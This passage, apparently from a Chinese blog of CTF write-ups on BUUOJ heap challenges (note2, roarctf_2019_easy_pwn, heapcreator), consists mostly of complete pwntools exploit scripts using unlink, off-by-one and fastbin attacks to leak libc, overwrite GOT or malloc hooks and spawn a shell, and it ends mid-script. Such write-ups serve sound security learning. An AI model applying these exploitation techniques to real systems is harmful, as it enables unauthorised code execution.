p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size of description: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,content)  </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name2&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;name3&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x198</span> + p32(free_got) </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;name4&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p32(sys_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h1><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h2 id="保护-3"><a href="#保护-3" class="headerlink" title="保护"></a>保护</h2><p><img src="/article/BUU_Heap/image-20210426213009013.png" alt="image-20210426213009013"></p><h2 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h2><ul><li>main：</li></ul><p><img src="/article/BUU_Heap/image-20210426213219224.png" alt="image-20210426213219224"></p><ul><li>add：</li></ul><p><img src="/article/BUU_Heap/image-20210426213325596.png" alt="image-20210426213325596"></p><ul><li>show：</li></ul><p><img src="/article/BUU_Heap/image-20210426213343065.png" alt="image-20210426213343065"></p><ul><li>edit</li></ul><p><img src="/article/BUU_Heap/image-20210426213401220.png" alt="image-20210426213401220"></p><ul><li><p>delete：</p><p><img src="/article/BUU_Heap/image-20210426213458792.png" alt="image-20210426213458792"></p></li></ul><p>4个主要选项</p><ul><li>add：最多只能同时拥有3个堆块，content 少于 0x80，最重要的是堆块的指针会放在一个 bss 段中进行管理</li><li>show：打印 Content</li><li>edit：无论选什么都会申请一个 0xA0 的堆块，并且不会程序不会对其 free </li><li>free：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">&#x27;b&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">128</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210426130700596.png" alt="image-20210426130700596"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210426131056598.png" alt="image-20210426131056598"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210426131256317.png" alt="image-20210426131256317"></p><p>此时unlink成功执行了，导致第一个chunk，也就是ptr[0]所存储的地址变为 fakebk，即 ptr - 0x18，现在只要把我们想要的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28824)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of the note content:(less than 128)&#x27;</span>,<span class="built_in">str</span>((size)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the note content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,choice</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[1.overwrite/2.append]&#x27;</span>,<span class="built_in">str</span>(choice)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TheNewContents:&#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your name:&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your address:&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">&#x27;b&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">128</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;f&#x27;</span>+<span class="string">&#x27;e&#x27;</span> * <span class="number">0x17</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,payload,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content is &#x27;</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"></span><br><span class="line">offset = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h1><p>ida</p><p>main</p><p><img src="/article/BUU_Heap/image-20210530180818212.png" alt="image-20210530180818212"></p><p>add</p><p><img src="/article/BUU_Heap/image-20210530180843629.png" alt="image-20210530180843629"></p><p>edit</p><p><img src="/article/BUU_Heap/image-20210530180910931.png" alt="image-20210530180910931"></p><p><img src="/article/BUU_Heap/image-20210530180924105.png" alt="image-20210530180924105"></p><p>当size与content长度相差10的时候，有off by one漏洞</p><p>free</p><p><img src="/article/BUU_Heap/image-20210530181018439.png" alt="image-20210530181018439"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ul><li>利用 off-by-one 和 chunk overlapping 来 leak 出 libc 地址</li><li>利用 off-by-one 和 fastbin attack 在 malloc hook上方申请fake fastbin</li><li>利用 realloc调整 rsp的值达成 getshell的条件（这题不能直接onegadget</li></ul><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>1、申请4个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1 change size</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2 overlapping chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3 top chunk</span></span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210530193522667.png" alt="image-20210530193522667"></p><p>2、利用 off-by-one修改 chunk1的 size位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210530194139167.png" alt="image-20210530194139167"></p><p>chunk2 的作用就是让 chunk1 + chunk2 的长度等于我们修改的 size大小</p><p>3、free unsortedbin</p><p><img src="/article/BUU_Heap/image-20210530195228812.png" alt="image-20210530195228812"></p><p>4、</p><p><img src="/article/BUU_Heap/image-20210530195253925.png" alt="image-20210530195253925"></p><p>把chunk1申请回来，此时 main_arena + 88 的地址就在 chunk2中了</p><p>5、fastbin attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 5 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 6 change size</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 7 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 8 </span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 9 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)<span class="comment">#change 7 size</span></span><br></pre></td></tr></table></figure><p>用和上面一样的方法修改size位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)<span class="comment"># 6 and 7</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment"># free 8</span></span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210530201524535.png" alt="image-20210530201524535"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p><img src="/article/BUU_Heap/image-20210530200403737.png" alt="image-20210530200403737"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">6</span>,<span class="number">0x80</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fake_fast) + p64(<span class="number">0</span>)*<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p>6、修改fd</p><p><img src="/article/BUU_Heap/image-20210530201903053.png" alt="image-20210530201903053"></p><p>7、利用 realloc_hook调整rsp，然后getshell</p><p><img src="/article/BUU_Heap/image-20210530202940484.png" alt="image-20210530202940484"></p><h2 id="exp：-3"><a href="#exp：-3" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28530</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1 change size</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">fake_fast = malloc_hook - <span class="number">0x23</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 4 malloc back</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_arena)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 5 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 6 change size</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 7 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 8 </span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 9 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)<span class="comment">#change 7 size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)<span class="comment"># 6 and 7</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment"># free 8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x80</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fake_fast) + p64(<span class="number">0</span>)*<span class="number">11</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#10 fake fastbin</span></span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0x4526a</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(one) + p64(realloc+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_arena)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h1><h2 id="Chunk-Overlapping"><a href="#Chunk-Overlapping" class="headerlink" title="Chunk Overlapping"></a>Chunk Overlapping</h2><p>菜单堆题</p><p>IDA</p><ul><li>create</li></ul><p><img src="/article/BUU_Heap/image-20210722183034862.png" alt="image-20210722183034862"></p><ul><li><p>edit</p><p><img src="/article/BUU_Heap/image-20210722183123853.png" alt="image-20210722183123853"></p><p>存在 off by one </p></li></ul><h2 id="exp：-4"><a href="#exp：-4" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 